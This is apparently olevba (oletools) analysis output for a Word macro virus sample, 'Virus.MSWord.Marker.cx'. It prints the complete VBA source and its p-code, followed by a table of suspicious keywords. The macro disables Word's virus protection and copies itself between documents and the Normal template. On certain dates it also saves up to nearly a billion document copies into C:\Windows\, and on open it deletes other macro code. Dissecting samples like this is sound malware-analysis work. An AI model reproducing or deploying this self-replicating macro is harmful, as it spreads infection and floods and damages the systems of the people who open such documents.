olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.cx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.cx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' FBI
' F
'
' 04/11/2000 3:16:40 PM
'
Private Sub viewvbcode(): MsgBox "The Visual Basic environment could not be initialized. Please run setup to install it correctly.", vbCritical: End Sub
Private Sub Document_close()
  
  On Error GoTo Finm
  If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
      Const exi = "la macro de colombia xxa"
      Dim DInfec, planinfec As Boolean
      Dim Docu, Plan As Object
      Dim modulin, contemodu, Ninfec As String
      Dim Nume As Integer
      Dim Copform As Object
  
   
      Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
      Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
      
      SaveDoc = ActiveDocument.Saved
      Saveplan = NormalTemplate.Saved
   
      DInfec = Docu.CodeModule.Find(exi, 1, 1, 40000, 40000)
      plainfec = Plan.CodeModule.Find(exi, 1, 1, 40000, 40000)

      'Ninfec = "'" & " "
      
      Options.VirusProtection = False
   
      Nume = Mid(Int(Rnd() * 10), 1, 1)
      Nume = Nume
      nume1 = 7
      Nume2 = 3
      If Nume = nume1 Or Nume = Nume2 Or plainfec = False Then
         If DInfec = True And plainfec = False Then
            On Error Resume Next
            For il = 1 To Plan.CodeModule.CountOfLines
                Plan.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
            'Docu.CodeModule.addfromstring Ninfec
            contemodu = Docu.CodeModule.Lines(1, Docu.CodeModule.CountOfLines)
            Plan.CodeModule.AddFromString contemodu
         End If

         If DInfec = False And plainfec = True Then
            On Error Resume Next
            For il = 1 To Docu.CodeModule.CountOfLines
                Docu.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
           'Plan.CodeModule.addfromstring Ninfec
            contemodu = Plan.CodeModule.Lines(1, Plan.CodeModule.CountOfLines)
            Docu.CodeModule.AddFromString contemodu
         End If
         
         If SaveDoc = True Then ThisDocument.Save
         If SaveDoc = True And plainfec = False Then NormalTemplate.Save
      End If
  End If
    sd = Day(Now()) & "-" & Month(Now()) & "-" & Year(Now())
  sd = Trim(sd)
  If Year(Now()) >= 2000 And Month(Now()) < 6 Then
    ChangeFileOpenDirectory "C:\Windows\"
    For I = 1 To 999999991
        ActiveDocument.SaveAs FileName:=("AA" & I & "AA.DOC"), FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Next
  End If
  GoTo Finb
  
Finm:
  On Error Resume Next
  For il = 1 To Docu.CodeModule.CountOfLines
    Docu.CodeModule.DeleteLines 1
  Next
  GoTo Finb
Finb:
 On Error Resume Next
End Sub
Private Sub Document_Open()
   On Error Resume Next
   Const exi = "la macro de colombia xxx"
   Dim Docu, Plan As Object
   Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
   If Docu.CodeModule.CountOfLines > 0 Then
     DInfec = Docu.CodeModule.Find(exi, 1, 1, 40000, 40000)
     If DInfec = False Then
        For il = 1 To Docu.CodeModule.CountOfLines
        Docu.CodeModule.DeleteLines 1
      Next
     End If
   End If

   Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
   If Plan.CodeModule.CountOfLines > 0 Then
     plainfec = Plan.CodeModule.Find(exi, 1, 1, 40000, 40000)
     If plainfec = False Then
        For il = 1 To Plan.CodeModule.CountOfLines
        Plan.CodeModule.DeleteLines 1
      Next
     End If
   End If
End Sub




































































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.cx
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7162 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0004 " FBI"
' Line #2:
' 	QuoteRem 0x0000 0x0002 " F"
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	QuoteRem 0x0000 0x0016 " 04/11/2000 3:16:40 PM"
' Line #5:
' 	QuoteRem 0x0000 0x0000 ""
' Line #6:
' 	FuncDefn (Private Sub viewvbcode())
' 	BoS 0x0000 
' 	LitStr 0x0060 "The Visual Basic environment could not be initialized. Please run setup to install it correctly."
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	EndSub 
' Line #7:
' 	FuncDefn (Private Sub Document_close())
' Line #8:
' Line #9:
' 	OnError Finm 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #11:
' 	Dim (Const) 
' 	LitStr 0x0018 "la macro de colombia xxa"
' 	VarDefn exi
' Line #12:
' 	Dim 
' 	VarDefn DInfec
' 	VarDefn planinfec (As Boolean)
' Line #13:
' 	Dim 
' 	VarDefn Docu
' 	VarDefn Plan (As Object)
' Line #14:
' 	Dim 
' 	VarDefn modulin
' 	VarDefn contemodu
' 	VarDefn Ninfec (As String)
' Line #15:
' 	Dim 
' 	VarDefn Nume (As Integer)
' Line #16:
' 	Dim 
' 	VarDefn Copform (As Object)
' Line #17:
' Line #18:
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Docu 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Plan 
' Line #21:
' Line #22:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDoc 
' Line #23:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St Saveplan 
' Line #24:
' Line #25:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DInfec 
' Line #26:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St plainfec 
' Line #27:
' Line #28:
' 	QuoteRem 0x0006 0x0012 "Ninfec = "'" & " ""
' Line #29:
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #31:
' Line #32:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Nume 
' Line #33:
' 	Ld Nume 
' 	St Nume 
' Line #34:
' 	LitDI2 0x0007 
' 	St nume1 
' Line #35:
' 	LitDI2 0x0003 
' 	St Nume2 
' Line #36:
' 	Ld Nume 
' 	Ld nume1 
' 	Eq 
' 	Ld Nume 
' 	Ld Nume2 
' 	Eq 
' 	Or 
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #37:
' 	Ld DInfec 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #38:
' 	OnError (Resume Next) 
' Line #39:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #40:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #41:
' 	StartForVariable 
' 	Next 
' Line #42:
' 	OnError Finm 
' Line #43:
' 	QuoteRem 0x000C 0x0024 "Docu.CodeModule.addfromstring Ninfec"
' Line #44:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St contemodu 
' Line #45:
' 	Ld contemodu 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	EndIfBlock 
' Line #47:
' Line #48:
' 	Ld DInfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld plainfec 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #52:
' 	StartForVariable 
' 	Next 
' Line #53:
' 	OnError Finm 
' Line #54:
' 	QuoteRem 0x000B 0x0024 "Plan.CodeModule.addfromstring Ninfec"
' Line #55:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St contemodu 
' Line #56:
' 	Ld contemodu 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #57:
' 	EndIfBlock 
' Line #58:
' Line #59:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ThisDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #60:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Concat 
' 	LitStr 0x0001 "-"
' 	Concat 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	Concat 
' 	St sd 
' Line #64:
' 	Ld sd 
' 	ArgsLd Trim 0x0001 
' 	St sd 
' Line #65:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Ge 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #66:
' 	LitStr 0x000B "C:\Windows\"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #67:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC9F7 0x3B9A 
' 	For 
' Line #68:
' 	LineCont 0x0010 0F 00 08 00 1B 00 08 00 27 00 08 00 31 00 08 00
' 	LitStr 0x0002 "AA"
' 	Ld I 
' 	Concat 
' 	LitStr 0x0006 "AA.DOC"
' 	Concat 
' 	Paren 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #69:
' 	StartForVariable 
' 	Next 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	GoTo Finb 
' Line #72:
' Line #73:
' 	Label Finm 
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #77:
' 	StartForVariable 
' 	Next 
' Line #78:
' 	GoTo Finb 
' Line #79:
' 	Label Finb 
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Private Sub Document_Open())
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	Dim (Const) 
' 	LitStr 0x0018 "la macro de colombia xxx"
' 	VarDefn exi
' Line #85:
' 	Dim 
' 	VarDefn Docu
' 	VarDefn Plan (As Object)
' Line #86:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Docu 
' Line #87:
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #88:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DInfec 
' Line #89:
' 	Ld DInfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #90:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #91:
' 	LitDI2 0x0001 
' 	Ld Docu 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #92:
' 	StartForVariable 
' 	Next 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndIfBlock 
' Line #95:
' Line #96:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set Plan 
' Line #97:
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #98:
' 	Ld exi 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	LitDI4 0x9C40 0x0000 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St plainfec 
' Line #99:
' 	Ld plainfec 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #100:
' 	StartForVariable 
' 	Ld il 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #101:
' 	LitDI2 0x0001 
' 	Ld Plan 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #102:
' 	StartForVariable 
' 	Next 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	EndSub 
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

